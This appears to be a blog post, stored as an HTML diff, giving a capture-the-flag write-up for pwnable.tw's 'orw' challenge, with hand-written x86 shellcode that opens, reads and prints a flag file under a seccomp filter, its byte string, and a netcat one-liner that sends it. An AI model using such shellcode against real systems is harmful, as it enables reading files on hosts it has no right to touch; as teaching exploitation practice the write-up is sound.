@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+<meta content="pwnable.tw - orw" property="og:title"/>
+<meta content="article" property="og:type"/>
+<meta content="2019-06-11T19:45:48.202Z" property="og:published_time"/>
+<meta content="2019-09-15T19:37:08.225Z" property="og:modified_time"/>
+<meta content="Srikavin Ramkumar" property="og:author"/>
+<meta content="ctf-writeups" property="og:section"/>
+<meta content="pwnable.tw" property="og:tag"/>
+<meta content="binary-exploitation" property="og:tag"/>
+<meta content="pwntools" property="og:tag"/>
+<meta content="assembly" property="og:tag"/>
+<meta content="shellcode" property="og:tag"/>
+<meta content="/posts/pwnable-tw-orw/" property="og:url"/>
+
+    <title>pwnable.tw - orw - srikavin.me</title>
+    <link rel="stylesheet" href="/bundle.css">
+</head>
+
+<body>
+<nav>
+    <div class="nav-left">
+        <span>
+            <a href="https://srikavin.me" class="name">Srikavin Ramkumar</a>
+        </span>
+        <span>
+            <a href="/posts" class="nav-link">Posts</a>
+        </span>
+        <span>
+            <a class="nav-link" href="/tags">Tags</a>
+        </span>
+    </div>
+</nav>
+<section class="section">
+    <div class="container">
+        
+
+<div class="blog-container">
+    
+
+
+<div class="blog-header">
+    <h1 class="title">
+        
+        pwnable.tw - orw
+        
+    </h1>
+    <div class="subtitle">
+                    <span>Posted on
+                        <span class="date" title="Created: 2019-06-11T19:45:48.202Z&#10;Updated: 2019-09-15T19:37:08.225Z">June 11, 2019*
+                        </span>
+
+                        in ctf-writeups
+                        
+                </span>
+    </div>
+    <div class="tags">
+        
+        
+        <a href="&#x2F;tags&#x2F;pwnable-tw&#x2F;"><span class="tag minimal interactive">pwnable.tw</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="tag minimal interactive">binary-exploitation</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;pwntools&#x2F;"><span class="tag minimal interactive">pwntools</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;assembly&#x2F;"><span class="tag minimal interactive">assembly</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;shellcode&#x2F;"><span class="tag minimal interactive">shellcode</span></a>
+        
+    </div>
+</div>
+
+
+<div class="blog-content light">
+    <div class="blog-scrollspy">
+        <h1 class="scrollspy-label">Table of Contents</h1>
+        <ul>
+            
+            <li>
+                <a data-target="challenge" href="#challenge">Challenge</a>
+                
+            </li>
+            
+            <li>
+                <a data-target="solution" href="#solution">Solution</a>
+                
+            </li>
+            
+        </ul>
+    </div>
+
+    <h1 id="challenge">Challenge</h1>
+<blockquote>
+<p>Read the flag from <code>/home/orw/flag</code>.</p>
+<p>Only open read write syscall are allowed to use.</p>
+<p><code>nc chall.pwnable.tw 10001</code></p>
+</blockquote>
+<h1 id="solution">Solution</h1>
+<p>The binary simply reads in 200 bytes and then jumps to its address, after using <code>prctl</code> to prevent calling <code>execve</code>:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">int </span><span style="font-weight:bold;color:#795da3;">main</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">) {
+  orw_seccomp();
+  </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Give my your shellcode:&quot;</span><span style="color:#323232;">);
+  read(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">,shellcode,</span><span style="color:#0086b3;">200</span><span style="color:#323232;">);
+  (</span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">(code </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)shellcode)();
+  </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
+}
+</span></code></pre>
+<p>By using <code>strace</code>, we see that <code>orw_seccomp</code> calls <code>prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len = 12, filter = 0x400000020})</code>.<br />
+Based on this and the challenge description, it is clear that we cannot use a <code>execve</code> shell code like in the 
+<a href="https://srikavin.me/blog/posts/5cfff3292569df08a43d04cc-pwnabletw-start">previous challenge</a>.</p>
+<p>To assemble shellcode, I used an <a href="https://defuse.ca/online-x86-assembler.htm">online x86 assembler</a> rather than setting 
+up nasm. We know that the flag is located in <code>/home/orw/flag</code>. Our shellcode needs to accomplish the following:</p>
+<span id="continue-reading"></span><pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;">[</span><span style="color:#0086b3;">0x30</span><span style="color:#323232;">] buffer;
+fd </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">open(</span><span style="color:#183691;">&quot;/home/orw/flag&quot;</span><span style="color:#323232;">, RD_ONLY);
+read(fd, buffer, </span><span style="color:#0086b3;">0x30</span><span style="color:#323232;">);
+write(stdout, buffer, </span><span style="color:#0086b3;">0x30</span><span style="color:#323232;">);
+</span></code></pre>
+<p>We can refer to a <a href="http://shell-storm.org/shellcode/files/syscalls.html">Linux x86 syscall table</a> to see the syscall 
+numbers. The following is (sub-optimal) assembly code that I wrote that will open the file, read its contents, and write 
+to <code>stdout</code>.</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">push </span><span style="color:#0086b3;">0x6761
+</span><span style="font-weight:bold;color:#a71d5d;">push </span><span style="color:#0086b3;">0x6C662F77
+</span><span style="font-weight:bold;color:#a71d5d;">push </span><span style="color:#0086b3;">0x726F2F65
+</span><span style="font-weight:bold;color:#a71d5d;">push </span><span style="color:#0086b3;">0x6D6F682F
+
+</span><span style="font-weight:bold;color:#795da3;"># open(</span><span style="color:#183691;">&#39;/home/orw//flag&#39;</span><span style="color:#323232;">, </span><span style="font-weight:bold;color:#795da3;">RD_ONLY)
+</span><span style="font-weight:bold;color:#a71d5d;">xor </span><span style="color:#323232;">eax, eax
+</span><span style="font-weight:bold;color:#a71d5d;">add </span><span style="color:#323232;">eax, </span><span style="color:#0086b3;">5
+</span><span style="font-weight:bold;color:#a71d5d;">mov </span><span style="color:#323232;">ebx, esp
+</span><span style="font-weight:bold;color:#a71d5d;">xor </span><span style="color:#323232;">ecx, ecx </span><span style="font-weight:bold;color:#795da3;"># </span><span style="color:#0086b3;">0 </span><span style="font-weight:bold;color:#795da3;">= RD_ONLY
+</span><span style="font-weight:bold;color:#a71d5d;">xor </span><span style="color:#323232;">edx, edx </span><span style="font-weight:bold;color:#795da3;"># 
+</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="color:#0086b3;">0x80
+
+</span><span style="font-weight:bold;color:#795da3;"># read(fd</span><span style="color:#323232;">, esp, </span><span style="color:#0086b3;">0x30</span><span style="font-weight:bold;color:#795da3;">)
+</span><span style="font-weight:bold;color:#a71d5d;">mov </span><span style="color:#323232;">ebx, eax
+</span><span style="font-weight:bold;color:#a71d5d;">mov </span><span style="color:#323232;">eax, </span><span style="color:#0086b3;">3
+</span><span style="font-weight:bold;color:#a71d5d;">mov </span><span style="color:#323232;">ecx, esp
+</span><span style="font-weight:bold;color:#a71d5d;">add </span><span style="color:#323232;">edx, </span><span style="color:#0086b3;">0x30
+</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="color:#0086b3;">0x80
+
+</span><span style="font-weight:bold;color:#795da3;"># write(</span><span style="color:#0086b3;">1</span><span style="color:#323232;">, esp, </span><span style="color:#0086b3;">0x30</span><span style="font-weight:bold;color:#795da3;">)
+</span><span style="font-weight:bold;color:#a71d5d;">mov </span><span style="color:#323232;">eax, </span><span style="color:#0086b3;">4
+</span><span style="font-weight:bold;color:#a71d5d;">xor </span><span style="color:#323232;">ebx, ebx
+</span><span style="font-weight:bold;color:#a71d5d;">add </span><span style="color:#323232;">ebx, </span><span style="color:#0086b3;">1
+</span><span style="font-weight:bold;color:#a71d5d;">mov </span><span style="color:#323232;">ecx, esp
+</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="color:#0086b3;">0x80
+</span></code></pre>
+<p>Assembling it gives us the following byte string:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="color:#323232;">\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x31\xC0\x83\xC0\x05\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE1\x83\xC2\x30\xCD\x80\xB8\x04\x00\x00\x00\x31\xDB\x83\xC3\x01\x89\xE1\xCD\x80
+</span></code></pre>
+<p>Now we just have to pipe into the challenge, and we get the flag.</p>
+<pre style="background-color:#ffffff;">
+<code><span style="color:#323232;">python -c &#39;print &quot;\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x31\xC0\x83\xC0\x05\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE1\x83\xC2\x30\xCD\x80\xB8\x04\x00\x00\x00\x31\xDB\x83\xC3\x01\x89\xE1\xCD\x80&quot; | nc chall.pwnable.tw 10001
+</span></code></pre>
+</div>
+
+
+</div>
+
+<script src="https://utteranc.es/client.js"
+        repo="srikavin/blog"
+        issue-term="url"
+        label="💬comments"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </div>
+</section>
+
+<script src="/bundle.js"></script>
+ 
+
+</body>
+
+</html>
